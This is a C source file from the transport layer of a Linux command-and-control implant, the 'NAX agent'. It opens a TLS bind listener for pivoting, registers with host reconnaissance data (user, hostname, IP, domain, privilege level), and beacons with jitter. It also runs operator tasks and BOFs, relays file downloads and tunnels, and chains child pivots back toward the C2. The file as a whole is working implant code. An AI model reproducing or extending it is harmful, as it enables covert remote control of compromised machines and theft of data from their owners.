/* nax_linux/src/Transport/tcp_bind.c
 * Bind-mode TCP transport for the Linux NAX agent (pivot / child-side).
 */

#include "nax_linux.h"
#include "opsec.h"
#include <pthread.h>
#include "sysinfo.h"
#include "commands.h"

#include "nax_bof_sdk.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <poll.h>
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <openssl/evp.h>
#include <openssl/x509.h>

int nax_encrypt(const uint8_t *, const uint8_t *, uint32_t, uint8_t *, uint32_t *);
int nax_decrypt(const uint8_t *, const uint8_t *, uint32_t, uint8_t *, uint32_t *);
int nax_frame_encode(uint8_t, const uint8_t *, uint32_t, uint8_t *, uint32_t *);
int nax_frame_decode(const uint8_t *, uint32_t, uint8_t *, uint8_t **, uint32_t *);
int nax_build_reg_body(const char *, uint32_t, const char *, uint32_t,
                       uint8_t, uint32_t, uint32_t, uint32_t,
                       const char *, uint32_t, const char *, uint32_t,
                       const char *, uint32_t, uint8_t,
                       uint32_t, uint32_t, uint16_t,
                       uint32_t, uint32_t, uint32_t,
                       const char *, uint32_t,
                       uint8_t *, uint32_t *);
int nax_build_heartbeat(uint8_t *, uint32_t *);
int nax_build_result(uint32_t, uint8_t, const uint8_t *, uint32_t,
                     uint8_t *, uint32_t *);
int nax_decode_task(const uint8_t *, uint32_t, NaxTask *);
void nax_gather_sysinfo(NaxSysInfo *info);
uint8_t nax_dispatch(NaxAgent *, NaxTask *, uint8_t **, uint32_t *);
const char *nax_read_lenstr(const uint8_t *, uint32_t, uint32_t *, uint32_t *);

/* ===== TLS server ===== */
static SSL_CTX *g_bind_ssl_ctx = NULL;
static SSL     *g_cli_ssl      = NULL;

static int tls_server_init(void) {
    if (g_bind_ssl_ctx) return 0;
    g_bind_ssl_ctx = SSL_CTX_new(TLS_server_method());
    if (!g_bind_ssl_ctx) return -1;

    EVP_PKEY *pkey = NULL;
    EVP_PKEY_CTX *kctx = EVP_PKEY_CTX_new_id(EVP_PKEY_RSA, NULL);
    if (!kctx || EVP_PKEY_keygen_init(kctx) <= 0 ||
        EVP_PKEY_CTX_set_rsa_keygen_bits(kctx, 2048) <= 0 ||
        EVP_PKEY_keygen(kctx, &pkey) <= 0) {
        if (kctx) EVP_PKEY_CTX_free(kctx);
        if (pkey) EVP_PKEY_free(pkey);
        SSL_CTX_free(g_bind_ssl_ctx); g_bind_ssl_ctx = NULL;
        return -1;
    }
    EVP_PKEY_CTX_free(kctx);

    X509 *x509 = X509_new();
    if (!x509) { EVP_PKEY_free(pkey); SSL_CTX_free(g_bind_ssl_ctx); g_bind_ssl_ctx = NULL; return -1; }
    if (ASN1_INTEGER_set(X509_get_serialNumber(x509), 1) <= 0 ||
        !X509_gmtime_adj(X509_get_notBefore(x509), 0) ||
        !X509_gmtime_adj(X509_get_notAfter(x509), 365 * 24 * 3600)) {
        X509_free(x509); EVP_PKEY_free(pkey); SSL_CTX_free(g_bind_ssl_ctx); g_bind_ssl_ctx = NULL; return -1;
    }
    if (X509_set_pubkey(x509, pkey) <= 0) { X509_free(x509); EVP_PKEY_free(pkey); SSL_CTX_free(g_bind_ssl_ctx); g_bind_ssl_ctx = NULL; return -1; }
    X509_NAME *name = X509_get_subject_name(x509);
    if (!name ||
        X509_NAME_add_entry_by_txt(name, "CN", MBSTRING_ASC, (unsigned char *)"localhost", -1, -1, 0) <= 0 ||
        X509_set_issuer_name(x509, name) <= 0) {
        X509_free(x509); EVP_PKEY_free(pkey); SSL_CTX_free(g_bind_ssl_ctx); g_bind_ssl_ctx = NULL; return -1;
    }
    if (X509_sign(x509, pkey, EVP_sha256()) <= 0) { X509_free(x509); EVP_PKEY_free(pkey); SSL_CTX_free(g_bind_ssl_ctx); g_bind_ssl_ctx = NULL; return -1; }

    if (SSL_CTX_use_certificate(g_bind_ssl_ctx, x509) <= 0 ||
        SSL_CTX_use_PrivateKey(g_bind_ssl_ctx, pkey) <= 0) { X509_free(x509); EVP_PKEY_free(pkey); SSL_CTX_free(g_bind_ssl_ctx); g_bind_ssl_ctx = NULL; return -1; }
    SSL_CTX_set_mode(g_bind_ssl_ctx, SSL_MODE_AUTO_RETRY);

    X509_free(x509);
    EVP_PKEY_free(pkey);
    return 0;
}

static SSL *tls_accept(int sock) {
    /* Set socket timeout to prevent blocking on incomplete handshakes.
     * If setsockopt fails, proceed anyway — worst case is a potential
     * block, which is the same behavior as before the timeout. */
    struct timeval tv = { 10, 0 };
    (void)setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    (void)setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));

    SSL *ssl = SSL_new(g_bind_ssl_ctx);
    if (!ssl) return NULL;
    if (SSL_set_fd(ssl, sock) <= 0 || SSL_accept(ssl) <= 0) { SSL_free(ssl); return NULL; }

    /* Clear timeouts after successful handshake */
    tv.tv_sec = 0;
    (void)setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    (void)setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
    return ssl;
}

/* TLS wrappers for length-prefixed I/O */
static int tls_recv_exact_s(SSL *ssl, uint8_t *buf, uint32_t len) {
    uint32_t got = 0;
    int retries = 0;
    while (got < len) {
        int r = SSL_read(ssl, buf + got, (int)(len - got));
        if (r > 0) { got += (uint32_t)r; retries = 0; continue; }
        int err = SSL_get_error(ssl, r);
        if ((err == SSL_ERROR_WANT_READ || err == SSL_ERROR_WANT_WRITE) && ++retries < 100) {
            usleep(1000); /* 1ms backoff to avoid busy-wait */
            continue;
        }
        return -1;
    }
    return 0;
}

static int tls_send_exact_s(SSL *ssl, const uint8_t *buf, uint32_t len) {
    uint32_t sent = 0;
    int retries = 0;
    while (sent < len) {
        int r = SSL_write(ssl, buf + sent, (int)(len - sent));
        if (r > 0) { sent += (uint32_t)r; retries = 0; continue; }
        int err = SSL_get_error(ssl, r);
        if ((err == SSL_ERROR_WANT_READ || err == SSL_ERROR_WANT_WRITE) && ++retries < 100) {
            usleep(1000);
            continue;
        }
        return -1;
    }
    return 0;
}

static int tls_lp_recv(SSL *ssl, uint8_t **out, uint32_t *out_len) {
    uint8_t hdr[4];
    if (tls_recv_exact_s(ssl, hdr, 4) < 0) return -1;
    uint32_t len = (uint32_t)hdr[0] | ((uint32_t)hdr[1]<<8) |
                   ((uint32_t)hdr[2]<<16) | ((uint32_t)hdr[3]<<24);
    if (!len || len > NAX_IO_CAP) return -1;
    *out = malloc(len);
    if (!*out) return -1;
    if (tls_recv_exact_s(ssl, *out, len) < 0) { free(*out); *out = NULL; return -1; }
    *out_len = len;
    return 0;
}

static int tls_lp_send(SSL *ssl, const uint8_t *data, uint32_t len) {
    uint8_t hdr[4] = { len&0xFF, (len>>8)&0xFF, (len>>16)&0xFF, (len>>24)&0xFF };
    if (tls_send_exact_s(ssl, hdr, 4) < 0) return -1;
    return tls_send_exact_s(ssl, data, len);
}

static int tls_send_encrypted(NaxAgent *a, SSL *ssl, uint8_t *frame, uint32_t frame_len) {
    uint32_t enc_cap = frame_len + NAX_AES_IV + NAX_AES_BLOCK;
    uint8_t *enc = malloc(enc_cap);
    if (!enc) return -1;
    uint32_t enc_len = enc_cap;
    int rc = nax_encrypt(a->cfg.aes_key, frame, frame_len, enc, &enc_len);
    if (rc == 0) rc = tls_lp_send(ssl, enc, enc_len);
    free(enc);
    return rc;
}

static void sleep_ms(uint32_t ms) {
    struct timespec ts = { ms / 1000, (long)(ms % 1000) * 1000000L };
    nanosleep(&ts, NULL);
}

static uint32_t effective_sleep_ms(NaxAgent *a) {
    if (!a->cfg.sleep_ms)    return 0;
    if (!a->cfg.jitter_pct)  return a->cfg.sleep_ms;
    uint32_t jit = (uint32_t)(((uint64_t)a->cfg.sleep_ms * a->cfg.jitter_pct) / 100);
    uint32_t off = jit ? (uint32_t)(random() % jit) : 0;
    return (random() & 1) ? a->cfg.sleep_ms + off
           : (a->cfg.sleep_ms > off ? a->cfg.sleep_ms - off : 0);
}

static void gen_session_id(char *out) {
    /* Stable ID from hostname + MAC — survives restarts */
    uint8_t raw[8] = {0};
    char hostname[64] = {0};
    gethostname(hostname, sizeof(hostname) - 1);
    size_t hlen = strlen(hostname);
    for (size_t i = 0; i < hlen && i < 8; i++) raw[i] ^= (uint8_t)hostname[i];
    {
        struct ifreq ifr; struct ifconf ifc; char buf[1024];
        int sock = socket(AF_INET, SOCK_DGRAM, 0);
        if (sock >= 0) {
            ifc.ifc_len = sizeof(buf); ifc.ifc_buf = buf;
            if (ioctl(sock, SIOCGIFCONF, &ifc) == 0) {
                struct ifreq *it = ifc.ifc_req;
                struct ifreq *end = it + (ifc.ifc_len / sizeof(*it));
                for (; it != end; ++it) {
                    strncpy(ifr.ifr_name, it->ifr_name, IFNAMSIZ-1);
                    if (ioctl(sock, SIOCGIFFLAGS, &ifr) != 0) continue;
                    if (ifr.ifr_flags & IFF_LOOPBACK) continue;
                    if (!(ifr.ifr_flags & IFF_UP)) continue;
                    if (ioctl(sock, SIOCGIFHWADDR, &ifr) != 0) continue;
                    uint8_t *mac = (uint8_t *)ifr.ifr_hwaddr.sa_data;
                    for (int i = 0; i < 6; i++) raw[i] ^= mac[i];
                    break;
                }
            }
            close(sock);
        }
    }
    int all_zero = 1;
    for (int i = 0; i < 8; i++) if (raw[i]) { all_zero = 0; break; }
    if (all_zero) {
        int fd = open("/dev/urandom", O_RDONLY);
        if (fd >= 0) { read(fd, raw, 8); close(fd); }
    }
    /* Mix in PID so each process execution gets a unique session ID */
    raw[4] ^= (uint8_t)(getpid() & 0xFF);
    raw[5] ^= (uint8_t)((getpid() >> 8) & 0xFF);

    /* Mix in bind port + mode flag so bind agents on the same host as a
     * connect-out agent always get a different session ID. */
#ifdef NAX_TCP_MODE_BIND
    raw[6] ^= (uint8_t)(NAX_BIND_PORT & 0xFF);
    raw[7] ^= (uint8_t)((NAX_BIND_PORT >> 8) & 0xFF) ^ 0xB1; /* 0xB1 = bind marker */
#endif
    static const char hex[] = "0123456789abcdef";
    for (int i = 0; i < 8; i++) {
        out[i*2]   = hex[(raw[i]>>4)&0xF];
        out[i*2+1] = hex[raw[i]&0xF];
    }
    out[16] = '\0';
}

static int tcp_recv_exact(int sock, uint8_t *buf, uint32_t len) {
    uint32_t got = 0;
    while (got < len) {
        ssize_t r = recv(sock, buf+got, len-got, 0);
        if (r <= 0) { if (r<0&&(errno==EINTR||errno==EAGAIN)) continue; return -1; }
        got += (uint32_t)r;
    }
    return 0;
}

static int tcp_send_exact(int sock, const uint8_t *buf, uint32_t len) {
    uint32_t sent = 0;
    while (sent < len) {
        ssize_t r = send(sock, buf+sent, len-sent, MSG_NOSIGNAL);
        if (r <= 0) { if (r<0&&(errno==EINTR||errno==EAGAIN)) continue; return -1; }
        sent += (uint32_t)r;
    }
    return 0;
}

static int lp_recv(int sock, uint8_t **out, uint32_t *out_len) {
    uint8_t hdr[4];
    if (tcp_recv_exact(sock, hdr, 4) < 0) return -1;
    uint32_t len = (uint32_t)hdr[0] | ((uint32_t)hdr[1]<<8) |
                   ((uint32_t)hdr[2]<<16) | ((uint32_t)hdr[3]<<24);
    if (!len || len > NAX_IO_CAP) return -1;
    *out = malloc(len);
    if (!*out) return -1;
    if (tcp_recv_exact(sock, *out, len) < 0) { free(*out); *out=NULL; return -1; }
    *out_len = len;
    return 0;
}

static int lp_send(int sock, const uint8_t *data, uint32_t len) {
    uint8_t hdr[4] = { len&0xFF, (len>>8)&0xFF, (len>>16)&0xFF, (len>>24)&0xFF };
    if (tcp_send_exact(sock, hdr, 4) < 0) return -1;
    return tcp_send_exact(sock, data, len);
}

/* Global C2 parent socket for tunnel results in bind mode.
 * Protected by g_sock_mutex so reader threads can write safely.
 * g_ssl_refcnt tracks how many threads are mid-operation on g_cli_ssl.
 * The main thread waits for it to reach 0 before freeing SSL. */
static int             g_tunnel_sock  = -1;
static pthread_mutex_t g_sock_mutex   = PTHREAD_MUTEX_INITIALIZER;
static int             g_ssl_refcnt   = 0;
static pthread_cond_t  g_ssl_cond     = PTHREAD_COND_INITIALIZER;

/* Acquire/release a reference to g_cli_ssl for thread-safe I/O.
 * Returns the SSL* or NULL if the session is closing. */
static SSL *ssl_ref_acquire(void) {
    pthread_mutex_lock(&g_sock_mutex);
    if (g_tunnel_sock < 0 || !g_cli_ssl) {
        pthread_mutex_unlock(&g_sock_mutex);
        return NULL;
    }
    g_ssl_refcnt++;
    SSL *ssl = g_cli_ssl;
    pthread_mutex_unlock(&g_sock_mutex);
    return ssl;
}

static void ssl_ref_release(void) {
    pthread_mutex_lock(&g_sock_mutex);
    g_ssl_refcnt--;
    if (g_ssl_refcnt <= 0) pthread_cond_signal(&g_ssl_cond);
    pthread_mutex_unlock(&g_sock_mutex);
}

static int send_encrypted(NaxAgent *a, int sock, uint8_t *frame, uint32_t frame_len) {
    (void)sock;
    SSL *ssl = ssl_ref_acquire();
    if (!ssl) return -1;
    int rc = tls_send_encrypted(a, ssl, frame, frame_len);
    ssl_ref_release();
    return rc;
}

static int do_register(NaxAgent *a, int sock) {
    NaxSysInfo info;
    nax_gather_sysinfo(&info);

    uint8_t  reg_body[4096];
    uint32_t reg_body_len = sizeof(reg_body);
    if (nax_build_reg_body(
            info.hostname, strlen(info.hostname),
            info.username, strlen(info.username),
            NAX_ARCH_CURRENT,
            info.pid, a->cfg.sleep_ms, info.tid,
            info.ip,       strlen(info.ip),
            info.domain,   strlen(info.domain),
            info.procname, strlen(info.procname),
            info.elevated,
            info.os_major, info.os_minor, info.os_build,
            info.ppid, 0, 0,
            info.imgpath, strlen(info.imgpath),
            reg_body, &reg_body_len) < 0) return -1;

    uint8_t *frame = malloc(NAX_IO_CAP);
    if (!frame) return -1;
    uint32_t frame_len = NAX_IO_CAP;
    if (nax_frame_encode(NAX_WIRE_REGISTER, reg_body, reg_body_len, frame, &frame_len) < 0)
        { free(frame); return -1; }

    uint32_t enc_cap = frame_len + NAX_AES_IV + NAX_AES_BLOCK;
    uint8_t *enc = malloc(enc_cap);
    if (!enc) { free(frame); return -1; }
    uint32_t enc_len = enc_cap;
    if (nax_encrypt(a->cfg.aes_key, frame, frame_len, enc, &enc_len) < 0)
        { free(frame); free(enc); return -1; }
    free(frame);

    /* Beat layout: [wm(4)][aes_key(16)][sessionId(16)][ciphertext]
     * Including the AES key lets InternalHandler (any parent transport)
     * correctly register the child regardless of the parent's own key. */
    uint32_t beat_len = 4 + 16 + NAX_SID_LEN + enc_len;
    uint8_t *beat = malloc(beat_len);
    if (!beat) { free(enc); return -1; }
    uint32_t wm = a->cfg.wm;
    beat[0]=wm&0xFF; beat[1]=(wm>>8)&0xFF; beat[2]=(wm>>16)&0xFF; beat[3]=(wm>>24)&0xFF;
    memcpy(beat+4, a->cfg.aes_key, 16);
    memcpy(beat+4+16, a->session_id, NAX_SID_LEN);
    memcpy(beat+4+16+NAX_SID_LEN, enc, enc_len);
    free(enc);

    int rc = tls_lp_send(g_cli_ssl, beat, beat_len);
    free(beat);
    return rc;
}

/* Forward declaration for tunnel.c */
extern void nax_process_tunnels(NaxAgent *a);
extern uint32_t nax_process_tunnels_ex(NaxAgent *a, uint8_t *out, uint32_t out_cap);



/* Public wrapper used by tunnel.c — send STATUS_TUNNEL frame in bind mode */


static int do_heartbeat(NaxAgent *a, int sock) {
    (void)sock;
    uint8_t  frame[NAX_FRAME_HDR + 64];
    uint32_t frame_len = sizeof(frame);
    if (nax_build_heartbeat(frame, &frame_len) < 0) return -1;
    if (!g_cli_ssl) return -1;
    return tls_send_encrypted(a, g_cli_ssl, frame, frame_len);
}

/* ===== process_pivots_bind =============================================
 * Read pending data from child pivot sockets and relay to the parent.
 * Mirror of process_pivots() in tcp.c but sends to parent sock instead
 * of C2. The parent will forward the data up the chain to the C2.
 * ==================================================================== */
static void process_pivots_bind(NaxAgent *a, int parent_sock)
{
    NaxPivot **pp = &a->pivot_head;
    while (*pp) {
        NaxPivot *p = *pp;
        int broken  = 0;

        struct pollfd pfd = { .fd = p->sock, .events = POLLIN };
        while (1) {
            int pr = poll(&pfd, 1, 0);
            if (pr <= 0) break;
            if (!(pfd.revents & POLLIN)) break;

            uint8_t lenbuf[4];
            ssize_t got = 0;
            while (got < 4) {
                ssize_t r = p->ssl ? SSL_read((SSL*)p->ssl, lenbuf + got, 4 - got) : recv(p->sock, lenbuf + got, 4 - got, 0);
                if (r <= 0) { broken = 1; break; }
                got += r;
            }
            if (broken) break;

            uint32_t msg_len = (uint32_t)lenbuf[0] | ((uint32_t)lenbuf[1]<<8) |
                               ((uint32_t)lenbuf[2]<<16) | ((uint32_t)lenbuf[3]<<24);
            if (msg_len == 0 || msg_len > 4 * 1024 * 1024) { broken = 1; break; }

            uint8_t *msg = malloc(msg_len);
            if (!msg) { broken = 1; break; }
            got = 0;
            while ((uint32_t)got < msg_len) {
                ssize_t r = p->ssl ? SSL_read((SSL*)p->ssl, msg + got, (int)(msg_len - (uint32_t)got)) : recv(p->sock, msg + got, msg_len - (uint32_t)got, 0);
                if (r <= 0) { free(msg); broken = 1; break; }
                got += r;
            }
            if (broken) break;

            /* Pack as PIV_TYPE_DATA and send to parent */
            uint32_t rd_len = 1 + 4 + 4 + msg_len;
            uint8_t *rd = malloc(rd_len);
            if (rd) {
                rd[0] = NAX_PIV_TYPE_DATA;
                rd[1] = (uint8_t)(p->pivot_id);       rd[2] = (uint8_t)(p->pivot_id>>8);
                rd[3] = (uint8_t)(p->pivot_id>>16);   rd[4] = (uint8_t)(p->pivot_id>>24);
                rd[5] = (uint8_t)(msg_len);            rd[6] = (uint8_t)(msg_len>>8);
                rd[7] = (uint8_t)(msg_len>>16);        rd[8] = (uint8_t)(msg_len>>24);
                memcpy(rd + 9, msg, msg_len);

                /* Build encrypted RESULT frame with task_id=0, status=STATUS_OK */
                uint8_t *res_frame = malloc(NAX_IO_CAP);
                if (res_frame) {
                    uint32_t res_len = NAX_IO_CAP;
                    if (nax_build_result(0, NAX_STATUS_OK, rd, rd_len,
                                        res_frame, &res_len) == 0) {
                        send_encrypted(a, parent_sock, res_frame, res_len);
                    }
                    free(res_frame);
                }
                free(rd);
            }
            free(msg);
        }

        if (broken) {
            /* Child disconnected — send UNLINK notification */
            uint8_t unlink_data[6];
            unlink_data[0] = NAX_PIV_TYPE_UNLINK;
            unlink_data[1] = (uint8_t)(p->pivot_id);    unlink_data[2] = (uint8_t)(p->pivot_id>>8);
            unlink_data[3] = (uint8_t)(p->pivot_id>>16); unlink_data[4] = (uint8_t)(p->pivot_id>>24);
            unlink_data[5] = 2; /* NAX_PIVOT_TYPE_TCP */
            uint8_t *res_frame = malloc(NAX_IO_CAP);
            if (res_frame) {
                uint32_t res_len = NAX_IO_CAP;
                if (nax_build_result(0, NAX_STATUS_OK, unlink_data, sizeof(unlink_data),
                                    res_frame, &res_len) == 0) {
                    send_encrypted(a, parent_sock, res_frame, res_len);
                }
                free(res_frame);
            }
            if (p->ssl) { SSL_shutdown((SSL*)p->ssl); SSL_free((SSL*)p->ssl); }
            close(p->sock);
            *pp = p->next;
            free(p);
        } else {
            pp = &p->next;
        }
    }
}

static int handle_parent_data(NaxAgent *a, int sock,
                               uint8_t *raw, uint32_t raw_len) {
    uint8_t *plain = malloc(raw_len + NAX_AES_BLOCK);
    if (!plain) return 0;
    uint32_t plain_len = raw_len + NAX_AES_BLOCK;
    if (nax_decrypt(a->cfg.aes_key, raw, raw_len, plain, &plain_len) < 0)
        { free(plain); return 0; }

    uint8_t *cur = plain;
    uint32_t rem = plain_len;
    int dispatched = 0;
    while (rem >= NAX_FRAME_HDR) {
        uint8_t   ft = 0;
        uint8_t  *fb = NULL;
        uint32_t  fbl = 0;
        if (nax_frame_decode(cur, rem, &ft, &fb, &fbl) < 0) break;
        uint32_t step = NAX_FRAME_HDR + fbl;
        if (step > rem) break;
        cur += step; rem -= step;

        DBG("frame type=0x%02x bodyLen=%u", ft, fbl);
        if (ft == NAX_WIRE_NO_TASKS) { DBG("NO_TASKS frame"); break; }
        if (ft != NAX_WIRE_TASK)     continue;

        NaxTask task;
        if (nax_decode_task(fb, fbl, &task) < 0) continue;

        uint8_t *result     = NULL;
        uint32_t result_len = 0;
        DBG("dispatching cmd_id=0x%02x task_id=%u args_len=%u", task.cmd_id, task.task_id, task.args_len);
        uint8_t  status     = nax_dispatch(a, &task, &result, &result_len);
        DBG("dispatch done: status=0x%02x result_len=%u", status, result_len);

        /* Async BOFs send their result later */
        if (status == NAX_STATUS_ASYNC) {
            if (result) free(result);
            continue;
        }

        /* Pause so the server completes DispatchPostEncode and moves the task
         * into RunningTasks before we send the result. Without this,
         * TsTaskUpdate cannot find the task and silently drops the result. */
        sleep_ms(300);

        uint8_t *res_frame = malloc(NAX_IO_CAP);
        if (res_frame) {
            uint32_t res_len = NAX_IO_CAP;
            if (nax_build_result(task.task_id, status,
                                 result, result_len,
                                 res_frame, &res_len) == 0) {
                DBG("sending RESULT frame");
                send_encrypted(a, sock, res_frame, res_len);
                dispatched++;
            }
            free(res_frame);
        }
        if (result) free(result);
        if (!a->running) { free(plain); return -1; }
    }
    free(plain);

    return 0;
}

/* ===== main bind loop ===== */

typedef struct { NaxAgent *a; int sock; } bind_drain_ctx_t;

static void bind_async_cb(uint32_t task_id, uint8_t status,
                           const char *output, uint32_t output_len,
                           void *user_data) {
    bind_drain_ctx_t *ctx = (bind_drain_ctx_t *)user_data;
    uint8_t *frame = (uint8_t *)malloc(NAX_IO_CAP);
    if (!frame) return;
    uint32_t frame_len = NAX_IO_CAP;
    if (nax_build_result(task_id, status, (const uint8_t *)output, output_len,
                         frame, &frame_len) == 0) {
        send_encrypted(ctx->a, ctx->sock, frame, frame_len);
    }
    free(frame);
}

static void nax_bind_drain_async(NaxAgent *a, int sock) {
    bind_drain_ctx_t ctx = { a, sock };
    nax_async_drain(bind_async_cb, &ctx);
}

void nax_tcp_bind_main(NaxAgent *a) {
    gen_session_id(a->session_id);
    nax_bof_sdk_init();
    a->running = true;
    DBG("bind mode starting: port=%d wm=0x%08x", a->cfg.bind_port, a->cfg.wm);

    if (tls_server_init() < 0) { DBG_ERR("TLS server init failed"); return; }

    int srv = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (srv < 0) return;

    int reuse = 1;
    setsockopt(srv, SOL_SOCKET, SO_REUSEADDR, &reuse, sizeof(reuse));

    struct sockaddr_in addr = {0};
    addr.sin_family = AF_INET;
    addr.sin_port   = htons((uint16_t)a->cfg.bind_port);
#ifdef NAX_BIND_HOST
    if (inet_pton(AF_INET, NAX_BIND_HOST, &addr.sin_addr) <= 0)
        addr.sin_addr.s_addr = INADDR_ANY;
#else
    addr.sin_addr.s_addr = INADDR_ANY;
#endif

    if (bind(srv, (struct sockaddr *)&addr, sizeof(addr)) < 0 ||
        listen(srv, 1) < 0) { close(srv); return; }

    DBG("listening on port %d", a->cfg.bind_port);
    while (a->running) {
        int cli = accept(srv, NULL, NULL);
        if (cli < 0) { if (errno==EINTR) continue; break; }
        DBG("parent connected — TLS handshake");
        g_cli_ssl = tls_accept(cli);
        if (!g_cli_ssl) { DBG_ERR("TLS accept failed"); close(cli); continue; }
        DBG("TLS established");

        DBG("sending REGISTER beat");
        if (do_register(a, cli) < 0) { DBG("REGISTER failed"); SSL_shutdown(g_cli_ssl); SSL_free(g_cli_ssl); g_cli_ssl = NULL; close(cli); continue; }
        DBG("REGISTER sent OK");

        /* Set global parent socket for tunnel reader threads */
        pthread_mutex_lock(&g_sock_mutex);
        g_tunnel_sock = cli;
        pthread_mutex_unlock(&g_sock_mutex);

        /*
         * Heartbeat/task loop — event-driven with sleep.
         *
         * Protocol:
         *   1. Sleep for effective_sleep_ms (mirrors beacon timing on C2 side)
         *   2. Send HEARTBEAT to parent
         *   3. Wait up to (sleep_ms + 3s) for parent to relay tasks back
         *   4. If tasks arrive, dispatch and send results, then go to 1
         *   5. If timeout (no tasks), go to 1
         *
         * The sleep BEFORE the heartbeat is critical: it gives the C2 time
         * to process the previous result and queue the next task before the
         * child asks again. Without it the child hammers the parent with
         * heartbeats faster than the C2 can respond.
         */
        while (a->running) {
            /* Step 1: Sleep before sending heartbeat */
            uint32_t slp = effective_sleep_ms(a);
            if (slp > 0) sleep_ms(slp);

            /* Tunnel processing handled by reader threads */
            nax_opsec_heartbeat();

            /* Relay download chunks — TCP cap 256 KB */
            if (a->download_head) {
                uint32_t cap = 256 * 1024 + 64;
                uint8_t *dbuf = (uint8_t *)malloc(cap);
                if (dbuf) {
                    uint32_t total = nax_process_downloads(a, dbuf, cap);
                    uint32_t off = 0;
                    while (off + 8 <= total) {
                        uint32_t tid  = (uint32_t)dbuf[off]   | ((uint32_t)dbuf[off+1]<<8)
                                      | ((uint32_t)dbuf[off+2]<<16) | ((uint32_t)dbuf[off+3]<<24);
                        uint32_t dlen = (uint32_t)dbuf[off+4] | ((uint32_t)dbuf[off+5]<<8)
                                      | ((uint32_t)dbuf[off+6]<<16) | ((uint32_t)dbuf[off+7]<<24);
                        off += 8;
                        if (off + dlen > total) break;
                        uint32_t frame_cap = dlen + 256;
                        uint8_t *frame = (uint8_t *)malloc(frame_cap);
                        if (frame) {
                            uint32_t frame_len = frame_cap;
                            if (nax_build_result(tid, NAX_STATUS_OK, dbuf + off, dlen, frame, &frame_len) == 0)
                                send_encrypted(a, cli, frame, frame_len);
                            free(frame);
                        }
                        off += dlen;
                    }
                    free(dbuf);
                }
            }

            { /* relay tunnels */
                uint8_t *tbuf = (uint8_t *)malloc(4*1024*1024);
                if (tbuf) {
                    uint32_t tl = nax_process_tunnels_ex(a, tbuf, 4*1024*1024);
                    if (tl > 0) {
                        uint8_t *frame = (uint8_t *)malloc(NAX_IO_CAP);
                        if (frame) {
                            uint32_t flen = NAX_IO_CAP;
                            if (nax_build_result(0, NAX_STATUS_TUNNEL, tbuf, tl, frame, &flen) == 0)
                                send_encrypted(a, cli, frame, flen);
                            free(frame);
                        }
                    }
                    free(tbuf);
                }
            }

            /* Drain completed async BOF results */
            nax_bind_drain_async(a, cli);

            /* Relay any pending pivot child data to the parent */
            process_pivots_bind(a, cli);

            /* Step 2: Send heartbeat */
            DBG("sending HEARTBEAT");
            if (do_heartbeat(a, cli) < 0) { DBG("HEARTBEAT send failed"); break; }

            /* Step 3: Wait for parent to relay tasks.
             * When sleep=0 (no delay mode) use 50ms so the agent stays
             * responsive. Otherwise add 3s floor for slower C2 roundtrips. */
            /* When downloads are active use a short poll so chunks flow quickly */
            uint32_t poll_ms = (a->download_head) ? 100u :
                               (slp == 0)          ? 50u  : slp + 3000u;
            struct pollfd pfd = { .fd = cli, .events = POLLIN };
            int pr = poll(&pfd, 1, (int)poll_ms);

            if (pr < 0) { DBG("poll error"); break; }

            if (pr == 0) {
                DBG("poll timeout — no tasks from parent");
                if (a->download_head) {
                    uint32_t cap = 256 * 1024 + 64;
                    uint8_t *dbuf = (uint8_t *)malloc(cap);
                    if (dbuf) {
                        uint32_t total = nax_process_downloads(a, dbuf, cap);
                        uint32_t off = 0;
                        while (off + 8 <= total) {
                            uint32_t tid  = (uint32_t)dbuf[off]   | ((uint32_t)dbuf[off+1]<<8)
                                          | ((uint32_t)dbuf[off+2]<<16) | ((uint32_t)dbuf[off+3]<<24);
                            uint32_t dlen = (uint32_t)dbuf[off+4] | ((uint32_t)dbuf[off+5]<<8)
                                          | ((uint32_t)dbuf[off+6]<<16) | ((uint32_t)dbuf[off+7]<<24);
                            off += 8;
                            if (off + dlen > total) break;
                            uint32_t frame_cap = dlen + 256;
                            uint8_t *frame = (uint8_t *)malloc(frame_cap);
                            if (frame) {
                                uint32_t frame_len = frame_cap;
                                if (nax_build_result(tid, NAX_STATUS_OK, dbuf + off, dlen, frame, &frame_len) == 0)
                                    send_encrypted(a, cli, frame, frame_len);
                                free(frame);
                            }
                            off += dlen;
                        }
                        free(dbuf);
                    }
                }
                continue;
            }

            if (pfd.revents & (POLLHUP | POLLERR)) {
                DBG("parent disconnected (POLLHUP/POLLERR)");
                break;
            }

            if (pfd.revents & POLLIN) {
                uint8_t *raw     = NULL;
                uint32_t raw_len = 0;
                if (tls_lp_recv(g_cli_ssl, &raw, &raw_len) < 0) { DBG("tls_lp_recv failed"); break; }
                DBG("received %u bytes from parent", raw_len);
                int rc = handle_parent_data(a, cli, raw, raw_len);
                free(raw);
                if (rc < 0) break;
            }
        }

        /* Tear down: prevent new I/O, wait for in-flight ops, then free TLS.
         * 1. Set g_tunnel_sock = -1 → ssl_ref_acquire() returns NULL
         * 2. Wait until g_ssl_refcnt == 0 → all in-flight ops done
         * 3. Free SSL — guaranteed no thread is using it */
        pthread_mutex_lock(&g_sock_mutex);
        g_tunnel_sock = -1;
        while (g_ssl_refcnt > 0)
            pthread_cond_wait(&g_ssl_cond, &g_sock_mutex);
        pthread_mutex_unlock(&g_sock_mutex);
        if (g_cli_ssl) { SSL_shutdown(g_cli_ssl); SSL_free(g_cli_ssl); g_cli_ssl = NULL; }
        close(cli);
        gen_session_id(a->session_id);
    }

    close(srv);
    if (g_bind_ssl_ctx) { SSL_CTX_free(g_bind_ssl_ctx); g_bind_ssl_ctx = NULL; }
}
